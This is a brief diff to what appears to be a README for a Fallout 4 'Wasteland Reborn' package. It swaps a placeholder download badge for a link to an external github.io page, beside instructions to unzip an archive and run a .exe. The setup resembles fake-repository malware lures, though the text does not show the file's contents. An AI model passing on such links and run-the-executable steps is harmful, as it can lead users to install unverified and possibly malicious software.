@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://fallout4-wasteland-reborn.github.io/.github/)
 
 ## 📸 Overview
   ![fallout4-wastelandreborn-visuals](https://github.com/user-attachments/assets/d90f07b8-b554-42dd-9d5a-932f9edfb1be)
